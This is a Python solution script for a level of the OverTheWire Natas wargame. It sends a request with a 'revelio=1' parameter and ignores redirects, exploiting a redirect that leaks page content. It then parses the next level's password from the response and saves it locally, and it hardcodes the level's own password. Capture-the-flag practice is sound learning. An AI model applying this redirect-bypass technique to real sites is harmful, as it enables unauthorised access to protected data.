import requests
from html.parser import HTMLParser
from pathlib import Path
import json

# CONSTANTS
USERNAME = "natas22"
TARGET_USER = "natas23"
PWD = "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF"
CREDENTIALS = (USERNAME, PWD)
API_URL = f"http://{USERNAME}.natas.labs.overthewire.org"

class MyHTMLParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.content_depth = 0
        self.in_pre = False
        self.found_pre = False
        self.pre_content = []

    def handle_starttag(self, tag, attrs):
        if tag == "div":
            if self.content_depth:
                self.content_depth += 1
            elif ("id", "content") in attrs:
                self.content_depth = 1
        elif tag == "pre" and self.content_depth and not self.found_pre:
            self.found_pre = True
            self.in_pre = True

    def handle_endtag(self, tag):
        if tag == "pre" and self.in_pre:
            self.in_pre = False
        elif tag == "div" and self.content_depth:
            self.content_depth -= 1

    def handle_data(self, data):
        if self.in_pre:
            self.pre_content.append(data)

class Credentials():
    def __init__(self, username = None, password = None):
        self.username = username
        self.password = password
    def __str__(self):
        return (
            f"Credentials:\n"
            f"  Username: {self.username}\n"
            f"  Password: {self.password}"
        )

def retrieve_credentials_from_html(page_html: str) -> Credentials:
    parser = MyHTMLParser()
    parser.feed(page_html)
    if parser.found_pre:
        raw_response = "".join(parser.pre_content)
        lines = raw_response.split("\n")
        if len(lines) > 2:
            print("[Debug] more than two lines")
            print(f"[Debug] {lines}")
            return None
        creds = Credentials()
        creds.username = lines[0].split(" ")[1]
        creds.password = lines[1].split(" ")[1]
        return creds
    return None

def save_credentials(creds: Credentials):
    # check for correct folder structure
    cwd = Path.cwd()
    if not cwd.as_posix().endswith("overthewire-wargames/natas/scripts"):
        raise Exception(f"Incorrect folder structure")

    target_file = cwd.parent / "list-usernames-passwords.json"
    if not target_file.is_file():
        raise Exception(f"Couldn't locate target file: {target_file}")

    with target_file.open("r+") as f:
        credentials_list = json.loads(f.read())
        credentials_list[creds.username] = creds.password
        f.seek(0) # go back to the start of the file
        json.dump(credentials_list, f, indent=4)
        f.truncate() # remove any leftover bytes from the old content

        
    return

if __name__ == "__main__":
    try:
        print("[+] Sending request to website to exploit vulnerability on their session checks when revelio=1 is passed as a get parameter")
        r1 = requests.get(
            API_URL,
            auth=CREDENTIALS,
            params={ "revelio": "1" },
            allow_redirects=False
        )
        r1.raise_for_status()
        print("[+] Request was successful")
        result = retrieve_credentials_from_html(r1.text)
        if result:
            print("[!] User and password successfully retrieved")
            print(result)

            consent = input("Save credentials to 'list-usernames-passwords.json' file?(y/n) ").lower()
            if consent == "y":
                save_credentials(result)
        else:
            print("[!] We couldn't retrieve the password. This is what we got instead: ")
            print(r1.text)
    except requests.exceptions.RequestException as error:
        print(f"[-] Request failed: {error}")
    except Exception as error:
        print(f"[-] Error: {error}")